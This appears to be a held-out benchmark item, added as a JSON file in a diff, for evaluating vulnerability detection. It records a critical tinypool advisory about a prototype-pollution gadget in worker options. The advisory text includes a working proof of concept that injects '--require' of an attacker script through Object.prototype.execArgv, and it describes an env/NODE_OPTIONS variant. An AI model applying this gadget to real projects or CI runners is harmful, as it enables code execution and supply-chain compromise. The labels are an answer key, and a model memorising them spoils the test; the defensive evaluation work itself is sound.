@@ -1,0 +1,56 @@
+{
+  "id": "ghsa-5gmw-xhrv-c9v3",
+  "title": "tinypool: Tinypool: Prototype Pollution gadget in worker options leads to Remote Code Execution",
+  "role": "heldout",
+  "repo": {
+    "url": "https://github.com/tinylibs/tinypool",
+    "commit": "abc247f85cba0309e3f1e5655db1837a2a1c2483",
+    "partial": true
+  },
+  "language": "javascript",
+  "framework": "",
+  "provenance": "Labels come from the maintainers' fix commit, not from a model: the lines it changed or removed in its parent commit (advisory GHSA-5gmw-xhrv-c9v3). Whether the patch really addresses the advisory is recorded in history.label_review.",
+  "contamination": "Advisory published 2026-10-05 and fix committed 2026-08-23, both on or after 2026-03-10, after the 2026-03-03 release of gemini-3.1-flash-lite (knowledge cutoff January 2025): that model cannot have trained on this fix. A model with a later cutoff might have. The code may still resemble earlier public fixes of similar bugs in the same project.",
+  "bugs": [
+    {
+      "id": "ghsa-5gmw-xhrv-c9v3",
+      "title": "Tinypool: Prototype Pollution gadget in worker options leads to Remote Code Execution",
+      "class": "prototype-pollution",
+      "cwe": "CWE-1321",
+      "locations": [
+        {
+          "file": "src/index.ts",
+          "lines": [
+            658,
+            658
+          ]
+        }
+      ],
+      "notes": "Judge a finding against the advisory text in `history`, not only against the lines."
+    }
+  ],
+  "variants": {},
+  "history": {
+    "advisory": "GHSA-5gmw-xhrv-c9v3",
+    "advisory_url": "https://github.com/advisories/GHSA-5gmw-xhrv-c9v3",
+    "severity": "critical",
+    "published": "2026-10-05",
+    "package": "tinypool",
+    "ecosystem": "npm",
+    "vulnerable_versions": "<= 2.1.0",
+    "patched": "2.1.1",
+    "fix_commit": "24df4e730e7d0857a6d226c9b58f8924227404fd",
+    "fix_url": "https://github.com/tinylibs/tinypool/commit/24df4e730e7d0857a6d226c9b58f8924227404fd",
+    "fix_date": "2026-08-23T14:21:31Z",
+    "changed_lines": 9,
+    "source_files_changed": [
+      "src/index.ts"
+    ],
+    "other_files_changed": 2,
+    "addition_only": false,
+    "source_bytes": 67152,
+    "fits_in_one_prompt": true,
+    "description": "`tinypool` passes worker options to `new Worker()` by reading them off a plain object whose prototype is `Object.prototype`. Options the application did not set are resolved through the prototype chain and then passed explicitly to `worker_threads.Worker`.\n\nNode core ignores `Worker` options inherited from `Object.prototype`. By reading them and passing them explicitly, tinypool re-materialises them as own properties and defeats that protection.\n\n\nTwo keys reach code execution:\n\n1. **`execArgv`** \u2014 polluting `Object.prototype.execArgv = ['--require', '/path/to/attacker.js']` causes every pool worker to load the attacker's script.\n2. **`env`** \u2014 polluting `Object.prototype.env = { NODE_OPTIONS: '--require /path/to/attacker.js' }` achieves the same via environment injection.\n\n## Root cause\n\n`dist/index.js` lines 508-511:\n\n```js\nenv:            this.options.env,\nargv:           this.options.argv,\nexecArgv:       this.options.execArgv,\nresourceLimits: this.options.resourceLimits,\n```\n\n`this.options` is built at line 470 via object spread:\n\n```js\nthis.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };\n```\n\n## Impact\n\nArbitrary code execution inside every worker the pool spawns, with the privileges of the host process. Because tinypool is the worker pool behind Vitest (~42M downloads/week), the natural blast radius is developer machines and CI runners \u2014 an attacker who lands a prototype-pollution primitive anywhere in the dependency tree gets code execution in the build/test pipeline, which is a supply-chain foothold (access to CI secrets, signing keys, artifact publishing).\n\n\n## Proof of concept\n\nMinimal reproduction (3 files):\n\n**worker.mjs** \u2014 the application's own legitimate worker:\n```js\nexport default function double(n) { return n * 2 }\n```\n\n**payload.js** \u2014 attacker-controlled code (never referenced by the app):\n```js\nconst fs = require('fs')\nfs.writeFileSync('/tmp/RCE_PROOF.txt', 'code execution achieved, pid=' + process.pid)\nconsole.log('*** RCE ***')\n```\n\n**app.js** \u2014 normal tinypool usage:\n```js\nconst path = require('path')\n\n// Simulates an upstream PP source (lodash/qs/minimist/set-value/deepmerge)\nObject.prototype.execArgv = ['--require', path.join(__dirname, 'payload.js')]\n\nconst { Tinypool } = require('tinypool')\nconst pool = new Tinypool({\n  filename: path.join(__dirname, 'worker.mjs'),\n  minThreads: 1, maxThreads: 1\n})\npool.run(21).then(r => {\n  console.log('pool returned:', r)  // 42 \u2014 app works normally\n  pool.destroy()\n})\n```\n\nRun:\n```\nnpm i tinypool@2.1.0\nnode app.js\ncat /tmp/RCE_PROOF.txt   # attacker's code ran\n```\n\nBoth `execArgv` and `env` vectors confirmed on Node 20.\n\n\n## Suggested fix\n\nResolve worker options with own-property semantics:\n\n```js\nthis.options = Object.assign(Object.create(null),\n  kDefaultOptions, options, { filename, maxQueue: 0 });\n```",
+    "label_review": "Claude read the fix patch against the advisory text on 2026-10-24 and found they match (one reader, not independently reviewed)."
+  }
+}
